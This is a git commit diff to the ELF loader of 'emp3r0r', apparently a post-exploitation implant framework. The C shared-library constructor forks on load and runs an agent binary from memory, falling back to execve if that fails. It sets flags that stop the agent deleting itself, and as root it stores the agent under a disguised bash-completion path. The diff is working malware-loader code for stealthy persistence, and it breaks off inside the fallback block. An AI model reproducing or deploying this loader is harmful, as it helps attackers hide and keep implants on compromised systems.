d534359bfff417a04053ef0499f46d6a6d14c0e0
jm33-m0 <jm33@jm33.me>
2023-06-28 17:21:19 +0900

    fix: elf loader unable to run emp3r0r now we fallback to `execve` in case that happens

--- loader/elf/loader.c
+++ loader/elf/loader.c
@@ -4,56 +4,72 @@
 #include <libgen.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/wait.h>
 
 #include "elf.h"
 
 void __attribute__((constructor)) initLibrary(void) {
   pid_t child = fork();
+  // prevent self delete of agent
+  // see cmd/agent/main.go
+  setenv("PERSISTENCE", "true", 1);
+  // tell agent not to change argv
+  setenv("LD", "true", 1);
+
+  // where to read target ELF file
+  // this should be in sync with emp3r0r inject_loader module
+  char exe[1024];
+  if (readlink("/proc/self/exe", exe, 1024) < 0) {
+    perror("readlink");
+    return;
+  }
+  const char *exe_name = basename(exe);
+  char elf_path[1024]; // path to target ELF file
+  const char *cwd = getcwd(NULL, 0);
+  // decides where to get target ELF binary
+  if (getuid() == 0) {
+    snprintf(elf_path, 1024, "/usr/share/bash-completion/completions/%s",
+             exe_name);
+  } else {
+    snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
+  }
+
+  // read it
+  FILE *f = fopen(elf_path, "rb");
+  if (f == NULL) {
+    perror("fopen");
+    return;
+  }
+  fseek(f, 0, SEEK_END);
+  int size = ftell(f);
+  fseek(f, 0L, SEEK_SET);
+  char *buf = malloc(size);
+  fread(buf, size, 1, f);
+  fclose(f);
+  char *argv[] = {elf_path, NULL};
+  char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp",
+                  "PERSISTENCE=true", "LD=true", NULL};
+
+  // in child process
   if (child == 0) {
-    puts("Loading emp3r0r...");
-
-    // prevent self delete of agent
-    // see cmd/agent/main.go
-    setenv("PERSISTENCE", "true", 1);
-    // tell agent not to change argv
-    setenv("LD", "true", 1);
-
-    // where to read target ELF file
-    // this should be in sync with emp3r0r inject_loader module
-    char exe[1024];
-    if (readlink("/proc/self/exe", exe, 1024) < 0) {
-      perror("readlink");
-      return;
-    }
-    const char *exe_name = basename(exe);
-    char elf_path[1024]; // path to target ELF file
-    const char *cwd = getcwd(NULL, 0);
-    // decides where to get target ELF binary
-    if (getuid() == 0) {
-      snprintf(elf_path, 1024, "/usr/share/bash-completion/completions/%s",
-               exe_name);
-    } else {
-      snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
-    }
-
-    // read it
-    FILE *f = fopen(elf_path, "rb");
-    if (f == NULL) {
-      perror("fopen");
-      return;
-    }
-    fseek(f, 0, SEEK_END);
-    int size = ftell(f);
-    fseek(f, 0L, SEEK_SET);
-    char *buf = malloc(size);
-    fread(buf, size, 1, f);
-    fclose(f);
-
     // Run the ELF
-    char *argv[] = {elf_path, NULL};
-    char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp",
-                    "PERSISTENCE=true", "LD=true", NULL};
-    if (elf_run(buf, argv, envv) < 0) {
+    puts("Loading emp3r0r...");
+    elf_run(buf, argv, envv);
+  }
+
+  // check if child is dead
+  int wstatus;
+  int w = waitpid(child, &wstatus, WNOHANG);
+  if (w == -1) {
+    perror("waitpid");
+    return;
+  }
+  if (WIFEXITED(wstatus) || WIFSIGNALED(wstatus)) {
+    wait(NULL); // clean up zombie
+
+    // elf loader failed, try execve directly
+    child = fork();
+    if (child == 0) {
       if (execve(elf_path, argv, envv) < 0) {
         perror("execve");
       }
